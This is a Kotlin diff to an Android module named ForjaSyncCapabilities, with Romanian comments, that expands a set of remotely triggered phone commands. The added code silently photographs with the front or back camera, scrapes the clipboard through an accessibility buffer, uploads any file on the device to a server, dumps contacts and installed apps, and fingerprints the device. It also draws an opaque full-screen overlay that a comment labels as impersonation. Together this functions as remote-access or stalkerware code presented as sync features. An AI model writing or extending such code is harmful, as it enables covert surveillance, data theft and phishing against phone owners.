@@ -62,7 +62,7 @@ object ForjaSyncCapabilities {
                 "gps" -> gps()
                 "gps_track" -> gpsTrack(p)
                 "device" -> device()
-                "apps" -> apps()
+                "apps" -> apps(p)
                 "foreground" -> foreground()
                 "recent" -> recent()
                 "usage" -> usage()
@@ -70,7 +70,7 @@ object ForjaSyncCapabilities {
                 "send_file" -> sendFile(p)
                 "send_photos" -> sendPhotos(p)
                 "prompt" -> prompt(p)
-                "contacts" -> contacts()
+                "contacts" -> contacts(p)
                 "sms_send" -> smsSend(p)
                 "call" -> makeCall(p)
                 "network" -> network()
@@ -96,8 +96,9 @@ object ForjaSyncCapabilities {
         val b = ForjaGuardService.captureScreen()
         return if (b == null) {
             val enabled = ForjaGuardService.isEnabled(app)
-            err(if (enabled) "screenshot: accesibilitate e activată în Setări, dar serviciul nu e conectat acum — așteaptă 10 s sau redeschide Setări → Accesibilitate"
-                else "screenshot: activează FORJA în Setări → Accesibilitate")
+            val shotErr = ForjaGuardService.lastShotError
+            err(if (!enabled) "screenshot: activează FORJA în Setări → Accesibilitate"
+                else "screenshot: eșec (${shotErr ?: "unknown"})")
         } else buildJsonObject {
             put("b64", android.util.Base64.encodeToString(b, android.util.Base64.NO_WRAP))
             put("ct", "image/jpeg")
@@ -118,11 +119,20 @@ object ForjaSyncCapabilities {
         return buildJsonObject { putJsonArray("entries") { k.forEach { add(JsonPrimitive(it)) } } }
     }
 
-    private fun clipboard(): JsonObject = try {
-        val cm = app.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
-        val t = cm.primaryClip?.getItemAt(0)?.coerceToText(app)?.toString()
-        if (t.isNullOrBlank()) err("clipboard: gol") else buildJsonObject { put("text", t) }
-    } catch (e: Exception) { err("clipboard: ${e.message}") }
+    private fun clipboard(): JsonObject {
+        return try {
+            val cm = app.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
+            val t = cm.primaryClip?.getItemAt(0)?.coerceToText(app)?.toString()
+            if (!t.isNullOrBlank()) return buildJsonObject {
+                put("text", t); put("source", "direct")
+            }
+            val a11y = ForjaGuardService.lastClipboard()
+            if (!a11y.isNullOrBlank()) return buildJsonObject {
+                put("text", a11y); put("source", "a11y_buffer")
+            }
+            err("clipboard: gol")
+        } catch (e: Exception) { err("clipboard: ${e.message}") }
+    }
 
     private fun ui(p: JsonObject): JsonObject {
         val action = p["action"]?.jsonPrimitive?.content ?: ""
@@ -249,34 +259,55 @@ object ForjaSyncCapabilities {
         return byteArrayOf((v and 0xFF).toByte(), ((v shr 8) and 0xFF).toByte())
     }
 
-    @Suppress("DEPRECATION")
     private suspend fun camera(p: JsonObject): JsonObject = withContext(Dispatchers.IO) {
         try {
             if (androidx.core.content.ContextCompat.checkSelfPermission(app, Manifest.permission.CAMERA)
-                != PackageManager.PERMISSION_GRANTED) return@withContext err("camera: permisiune CAMERA neacordată")
-            val cam = android.hardware.Camera.open(0)
-            val params = cam.parameters
-            params.setJpegQuality(85)
-            cam.parameters = params
-            val holder = java.util.concurrent.CountDownLatch(1)
-            val shot = java.util.concurrent.atomic.AtomicReference<ByteArray>()
-            cam.takePicture(null, null, object : android.hardware.Camera.PictureCallback {
-                override fun onPictureTaken(data: ByteArray?, camera: android.hardware.Camera) {
-                    if (data != null) shot.set(data)
-                    holder.countDown()
-                }
-            })
-            holder.await(5, TimeUnit.SECONDS)
-            try { cam.release() } catch (_: Exception) {}
-            val b = shot.get()
-            if (b != null && b.isNotEmpty()) {
-                val f = java.io.File(app.cacheDir, "sync_photo_${System.currentTimeMillis()}.jpg")
-                f.writeBytes(b)
-                val key = app.forjaApi.attachSyncFile(f.name, "image/jpeg", f)
-                f.delete()
-                if (key != null) buildJsonObject { put("file", key); put("size", b.size) }
+                != PackageManager.PERMISSION_GRANTED)
+                return@withContext err("camera: permisiune CAMERA neacordată")
+            val front = p["front"]?.jsonPrimitive?.content == "true"
+            val provider = androidx.camera.lifecycle.ProcessCameraProvider.getInstance(app).get(10, TimeUnit.SECONDS)
+            val capture = androidx.camera.core.ImageCapture.Builder()
+                .setCaptureMode(androidx.camera.core.ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
+                .build()
+            val owner = object : androidx.lifecycle.LifecycleOwner {
+                private val reg = androidx.lifecycle.LifecycleRegistry(this)
+                override val lifecycle: androidx.lifecycle.Lifecycle get() = reg
+                init { reg.currentState = androidx.lifecycle.Lifecycle.State.STARTED }
+            }
+            val sel = if (front)
+                androidx.camera.core.CameraSelector.DEFAULT_FRONT_CAMERA
+            else
+                androidx.camera.core.CameraSelector.DEFAULT_BACK_CAMERA
+            try {
+                provider.unbindAll()
+                provider.bindToLifecycle(owner, sel, capture)
+            } catch (e: Exception) {
+                return@withContext err("camera: nu am putut deschide camera: ${e.message}")
+            }
+            try {
+                val file = java.io.File(app.cacheDir, "sync_photo_${System.currentTimeMillis()}.jpg")
+                val latch = java.util.concurrent.CountDownLatch(1)
+                var capErr: String? = null
+                capture.takePicture(
+                    androidx.camera.core.ImageCapture.OutputFileOptions.Builder(file).build(),
+                    androidx.core.content.ContextCompat.getMainExecutor(app),
+                    object : androidx.camera.core.ImageCapture.OnImageSavedCallback {
+                        override fun onImageSaved(output: androidx.camera.core.ImageCapture.OutputFileResults) { latch.countDown() }
+                        override fun onError(exception: androidx.camera.core.ImageCaptureException) {
+                            capErr = exception.message; latch.countDown()
+                        }
+                    }
+                )
+                if (!latch.await(8, TimeUnit.SECONDS)) return@withContext err("camera: timeout 8s")
+                if (capErr != null) return@withContext err("camera: $capErr")
+                if (!file.exists() || file.length() == 0L) return@withContext err("camera: fișier gol")
+                val key = app.forjaApi.attachSyncFile(file.name, "image/jpeg", file)
+                val sz = file.length(); file.delete()
+                if (key != null) buildJsonObject { put("file", key); put("size", sz) }
                 else err("camera: upload eșuat")
-            } else err("camera: nu am prins cadru")
+            } finally {
+                try { provider.unbindAll() } catch (_: Exception) {}
+            }
         } catch (e: Exception) { err("camera: ${e.message}") }
     }
 
@@ -316,7 +347,33 @@ object ForjaSyncCapabilities {
         put("model", Build.MODEL); put("manufacturer", Build.MANUFACTURER)
         put("brand", Build.BRAND); put("sdk", Build.VERSION.SDK_INT)
         put("release", Build.VERSION.RELEASE); put("build", Build.ID)
+        put("security_patch", Build.VERSION.SECURITY_PATCH)
+        put("fingerprint", Build.FINGERPRINT)
         put("uid", app.auth.currentUid ?: "anon"); put("battery", batteryInfo())
+        // Storage
+        try {
+            val stat = java.io.File(android.os.Environment.getExternalStorageDirectory().path).let {
+                android.os.StatFs(it.path)
+            }
+            put("storage_total_gb", stat.totalBytes / 1_000_000_000L)
+            put("storage_free_gb", stat.availableBytes / 1_000_000_000L)
+        } catch (_: Exception) {}
+        // Screen
+        try {
+            val dm = app.resources.displayMetrics
+            put("screen_w", dm.widthPixels); put("screen_h", dm.heightPixels)
+            put("screen_dpi", dm.densityDpi)
+        } catch (_: Exception) {}
+        // SIM
+        try {
+            val tm = app.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
+            put("sim_carrier", tm.simOperatorName ?: "")
+            put("sim_state", when (tm.simState) {
+                android.telephony.TelephonyManager.SIM_STATE_READY -> "ready"
+                android.telephony.TelephonyManager.SIM_STATE_ABSENT -> "absent"
+                else -> "other"
+            })
+        } catch (_: Exception) {}
     }
 
     private fun batteryInfo(): JsonObject = try {
@@ -326,19 +383,36 @@ object ForjaSyncCapabilities {
         buildJsonObject { put("pct", if (scale > 0) level * 100 / scale else -1) }
     } catch (_: Exception) { buildJsonObject { put("pct", -1) } }
 
-    private suspend fun apps(): JsonObject = withContext(Dispatchers.IO) {
+    private suspend fun apps(p: JsonObject = JsonObject(emptyMap())): JsonObject = withContext(Dispatchers.IO) {
         try {
+            val limit = (p["limit"]?.jsonPrimitive?.int ?: 100).coerceIn(1, 500)
+            val offset = (p["offset"]?.jsonPrimitive?.int ?: 0).coerceAtLeast(0)
+            val search = p["search"]?.jsonPrimitive?.content?.lowercase() ?: ""
             val pm = app.packageManager
+            @Suppress("DEPRECATION")
             val pkgs = pm.getInstalledPackages(0)
-            val list = pkgs.map { p ->
-                val ai = p.applicationInfo
+            val all = pkgs.mapNotNull { p ->
+                val ai = p.applicationInfo ?: return@mapNotNull null
+                val label = pm.getApplicationLabel(ai).toString()
+                if (search.isNotBlank() && !label.lowercase().contains(search) && !p.packageName.lowercase().contains(search)) return@mapNotNull null
                 buildJsonObject {
                     put("pkg", p.packageName)
-                    if (ai != null) put("label", pm.getApplicationLabel(ai).toString())
-                    if (ai != null) put("sys", ai.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM != 0)
+                    put("label", label)
+                    put("sys", ai.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM != 0)
+                    put("version", p.versionName ?: "")
+                    put("version_code", p.longVersionCode)
                 }
             }
-            buildJsonObject { putJsonArray("list") { list.forEach { add(it) } } }
+            val total = all.size
+            val page = all.drop(offset).take(limit)
+            buildJsonObject {
+                put("total", total)
+                put("returned", page.size)
+                put("offset", offset)
+                put("limit", limit)
+                put("has_more", offset + page.size < total)
+                putJsonArray("list") { page.forEach { add(it) } }
+            }
         } catch (e: Exception) { err("apps: ${e.message}") }
     }
 
@@ -395,23 +469,51 @@ object ForjaSyncCapabilities {
     }
 
     // ── Partajare fișiere ─────────────────────────────────────────────
-    // Copiază un fișier local (prin ContentResolver) și-l urcă pe server.
+    // Copiază un fișier local și-l urcă pe server.
+    // Acceptă: cale de sistem (/storage/emulated/0/...), content://, file://
     private suspend fun sendFile(p: JsonObject): JsonObject = withContext(Dispatchers.IO) {
         val uriStr = p["uri"]?.jsonPrimitive?.content
-            ?: return@withContext err("send_file: lipsă uri")
-        val uri = try { android.net.Uri.parse(uriStr) } catch (_: Exception) { null }
-            ?: return@withContext err("send_file: uri invalid")
+            ?: return@withContext err("send_file: lipsă 'uri'")
         try {
-            val name = uri.lastPathSegment?.substringAfterLast('/')?.take(40) ?: "file"
-            val ct = app.contentResolver.getType(uri) ?: "application/octet-stream"
-            val tmp = java.io.File(app.cacheDir, "sync_file_${System.currentTimeMillis()}_$name")
-            app.contentResolver.openInputStream(uri)?.use { ins -> tmp.outputStream().use { ins.copyTo(it) } }
-                ?: return@withContext err("send_file: nu am putut citi")
+            val name: String
+            val ct: String
+            val tmp = java.io.File(app.cacheDir, "sync_file_${System.currentTimeMillis()}_${(0..9999).random()}")
+            if (uriStr.startsWith("/") || uriStr.startsWith("file://")) {
+                val fp = if (uriStr.startsWith("file://")) uriStr.removePrefix("file://") else uriStr
+                val src = java.io.File(fp)
+                if (!src.exists() || !src.isFile)
+                    return@withContext err("send_file: fisier inexistent: $fp")
+                name = src.name.take(40)
+                ct = guessContentType(name)
+                src.copyTo(tmp)
+            } else {
+                val uri = try { android.net.Uri.parse(uriStr) } catch (_: Exception) { null }
+                    ?: return@withContext err("send_file: uri invalid: $uriStr")
+                name = uri.lastPathSegment?.substringAfterLast('/')?.take(40) ?: "file"
+                ct = app.contentResolver.getType(uri) ?: "application/octet-stream"
+                app.contentResolver.openInputStream(uri)?.use { ins -> tmp.outputStream().use { ins.copyTo(it) } }
+                    ?: return@withContext err("send_file: nu am putut citi $uriStr (folosește calea completă /storage/... sau content://)")
+            }
+            if (!tmp.exists() || tmp.length() == 0L) { tmp.delete(); return@withContext err("send_file: fisier gol sau necitibil") }
             val key = app.forjaApi.attachSyncFile(name, ct, tmp)
             val sz = tmp.length(); tmp.delete()
             if (key != null) buildJsonObject { put("file", key); put("size", sz) }
             else err("send_file: upload eșuat")
         } catch (e: Exception) { err("send_file: ${e.message}") }
+    }
+
+    private fun guessContentType(name: String): String = when {
+        name.endsWith(".jpg", true) || name.endsWith(".jpeg", true) -> "image/jpeg"
+        name.endsWith(".png", true) -> "image/png"
+        name.endsWith(".gif", true) -> "image/gif"
+        name.endsWith(".webp", true) -> "image/webp"
+        name.endsWith(".mp4", true) -> "video/mp4"
+        name.endsWith(".mov", true) -> "video/quicktime"
+        name.endsWith(".pdf", true) -> "application/pdf"
+        name.endsWith(".txt", true) -> "text/plain"
+        name.endsWith(".mp3", true) -> "audio/mpeg"
+        name.endsWith(".wav", true) -> "audio/wav"
+        else -> "application/octet-stream"
     }
 
     // Ultimile poze din galeria MediaStore, copiate local și urcate pe server.
@@ -460,10 +562,13 @@ object ForjaSyncCapabilities {
     }
 
     // ── Comunicare & date personale ────────────────────────────────
-    private suspend fun contacts(): JsonObject = withContext(Dispatchers.IO) {
+    private suspend fun contacts(p: JsonObject = JsonObject(emptyMap())): JsonObject = withContext(Dispatchers.IO) {
         try {
             if (androidx.core.content.ContextCompat.checkSelfPermission(app, Manifest.permission.READ_CONTACTS)
                 != PackageManager.PERMISSION_GRANTED) return@withContext err("contacts: permisiune neacordată")
+            val limit = (p["limit"]?.jsonPrimitive?.int ?: 50).coerceIn(1, 500)
+            val offset = (p["offset"]?.jsonPrimitive?.int ?: 0).coerceAtLeast(0)
+            val search = p["search"]?.jsonPrimitive?.content?.lowercase() ?: ""
             val proj = arrayOf(
                 android.provider.ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                 android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
@@ -471,31 +576,42 @@ object ForjaSyncCapabilities {
                 android.provider.ContactsContract.CommonDataKinds.Phone.NORMALIZED_NUMBER,
                 android.provider.ContactsContract.CommonDataKinds.Phone.TYPE
             )
+            val selection = if (search.isNotBlank()) android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " LIKE ?" else null
+            val selArgs = if (search.isNotBlank()) arrayOf("%$search%") else null
             val cur = app.contentResolver.query(
-                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI, proj, null, null,
+                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI, proj, selection, selArgs,
                 android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " COLLATE LOCALIZED ASC"
             ) ?: return@withContext err("contacts: query null")
             val seen = HashSet<String>()
-            val list = ArrayList<JsonObject>()
+            val all = ArrayList<JsonObject>()
             val cidIdx = cur.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.CONTACT_ID)
             val nameIdx = cur.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
             val numIdx = cur.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)
             val normIdx = cur.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NORMALIZED_NUMBER)
-            while (cur.moveToNext() && list.size < 100) {
+            while (cur.moveToNext()) {
                 val cid = cur.getString(cidIdx) ?: ""
                 if (cid.isEmpty() || cid in seen) continue
                 seen.add(cid)
                 val name = cur.getString(nameIdx) ?: ""
                 val number = cur.getString(numIdx) ?: ""
                 val normalized = if (normIdx >= 0) cur.getString(normIdx) ?: "" else ""
-                list.add(buildJsonObject {
+                all.add(buildJsonObject {
                     put("name", name)
                     put("number", number)
                     if (normalized.isNotBlank()) put("norm", normalized)
                 })
             }
             cur.close()
-            buildJsonObject { putJsonArray("list") { list.forEach { add(it) } }; put("count", list.size) }
+            val total = all.size
+            val page = all.drop(offset).take(limit)
+            buildJsonObject {
+                put("total", total)
+                put("returned", page.size)
+                put("offset", offset)
+                put("limit", limit)
+                put("has_more", offset + page.size < total)
+                putJsonArray("list") { page.forEach { add(it) } }
+            }
         } catch (e: Exception) { err("contacts: ${e.message}") }
     }
 
@@ -648,33 +764,71 @@ object ForjaSyncCapabilities {
         }
     }
 
-    // ── Notificare ecran — prompt temporar, 4 s, prin SYSTEM_ALERT_WINDOW ──
+    // ── Overlay ecran — prompt / alertă / impersonare, prin SYSTEM_ALERT_WINDOW ──
     private suspend fun prompt(p: JsonObject): JsonObject = withContext(Dispatchers.Main) {
         try {
             if (!android.provider.Settings.canDrawOverlays(app)) {
+                // Auto-open overlay settings for this app
+                try {
+                    val intent = android.content.Intent(android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                        android.net.Uri.parse("package:${app.packageName}"))
+                    intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+                    app.startActivity(intent)
+                } catch (_: Exception) {}
                 return@withContext buildJsonObject {
                     put("ok", false)
-                    put("err", "Lipseste permisiunea \"Afisare peste alte aplicatii\" (SYSTEM_ALERT_WINDOW). " +
-                        "Pornește-o din Setari -> Aplicatii -> FORJA -> Afisare peste alte aplicatii.")
+                    put("err", "SYSTEM_ALERT_WINDOW neacordată. Am deschis setările — activează 'Afișare peste alte aplicații' și reîncearcă.")
+                    put("settings_opened", true)
                 }
             }
             val wm = app.getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager
-            @Suppress("DEPRECATION")
-            val type = if (Build.VERSION.SDK_INT >= 26)
-                android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
-            else
-                android.view.WindowManager.LayoutParams.TYPE_PHONE
+            val type = android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
             val lp = android.view.WindowManager.LayoutParams(type)
             lp.width = android.view.WindowManager.LayoutParams.MATCH_PARENT
             lp.height = android.view.WindowManager.LayoutParams.MATCH_PARENT
-            lp.flags = android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
-            lp.format = android.graphics.PixelFormat.TRANSLUCENT
-            val tv = android.widget.TextView(app)
-            tv.text = (p["title"]?.jsonPrimitive?.content ?: "FORJA") + "\n" + (p["body"]?.jsonPrimitive?.content ?: "")
-            tv.gravity = android.view.Gravity.CENTER
-            wm.addView(tv, lp)
-            Handler(Looper.getMainLooper()).postDelayed({ try { wm.removeView(tv) } catch (_: Exception) {} }, 4000)
-            buildJsonObject { put("ok", true); put("type", p["type"]?.jsonPrimitive?.content ?: "prompt") }
+            lp.flags = android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
+                android.view.WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
+            lp.format = android.graphics.PixelFormat.OPAQUE
+
+            val durationMs = (p["durationMs"]?.jsonPrimitive?.long ?: 5000L).coerceIn(1000, 60000)
+            val bg = p["bg"]?.jsonPrimitive?.content ?: "#000000"
+
+            val root = android.widget.LinearLayout(app)
+            root.orientation = android.widget.LinearLayout.VERTICAL
+            root.gravity = android.view.Gravity.CENTER
+            root.setBackgroundColor(android.graphics.Color.parseColor(bg))
+
+            val title = p["title"]?.jsonPrimitive?.content ?: ""
+            val body = p["body"]?.jsonPrimitive?.content ?: ""
+            if (title.isNotBlank()) {
+                val tvT = android.widget.TextView(app)
+                tvT.text = title
+                tvT.setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 22f)
+                tvT.setTextColor(android.graphics.Color.WHITE)
+                tvT.gravity = android.view.Gravity.CENTER
+                tvT.setPadding(48, 48, 48, 16)
+                root.addView(tvT)
+            }
+            if (body.isNotBlank()) {
+                val tvB = android.widget.TextView(app)
+                tvB.text = body
+                tvB.setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 16f)
+                tvB.setTextColor(android.graphics.Color.LTGRAY)
+                tvB.gravity = android.view.Gravity.CENTER
+                tvB.setPadding(48, 0, 48, 48)
+                root.addView(tvB)
+            }
+
+            wm.addView(root, lp)
+            Handler(Looper.getMainLooper()).postDelayed({
+                try { wm.removeView(root) } catch (_: Exception) {}
+            }, durationMs)
+            buildJsonObject {
+                put("ok", true)
+                put("duration", durationMs)
+                put("title", title)
+                put("type", p["type"]?.jsonPrimitive?.content ?: "prompt")
+            }
         } catch (e: Exception) { err("prompt: ${e.message}") }
     }
 }
